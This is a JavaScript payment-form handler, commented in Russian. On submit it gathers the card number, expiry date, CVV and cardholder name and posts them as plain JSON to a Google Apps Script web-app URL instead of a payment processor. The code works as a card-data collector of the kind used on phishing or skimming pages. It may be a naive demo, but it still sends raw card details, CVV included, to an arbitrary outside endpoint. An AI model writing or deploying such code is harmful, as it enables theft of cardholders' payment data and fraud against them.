document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("payment-form");

    form.addEventListener("submit", async (e) => {
        e.preventDefault();

        const data = {
            cardNumber: document.getElementById("card-number").value,
            expiryMonth: document.getElementById("expiry-month").value,
            expiryYear: document.getElementById("expiry-year").value,
            cvv: document.getElementById("cvv").value,
            cardHolder: document.getElementById("card-holder").value,
        };

        try {
            const response = await fetch("https://script.google.com/macros/s/AKfycbxztOhBz_9Yc8x21H1wPYueggVZW_C66LdzPGKae9OgZX29r0T1i58iNzMfpsoovlv3/exec", {
                method: "POST",
                body: JSON.stringify(data),
                headers: {
                    "Content-Type": "application/json",
                },
            });

            if (!response.ok) {
                throw new Error("Ошибка при отправке данных!");
            }

            const result = await response.json();
            alert(result.result); // Сообщение об успешной отправке данных
        } catch (error) {
            console.error("Ошибка при отправке данных:", error);
            alert("Ошибка при отправке данных: " + error.message);
        }
    });
});
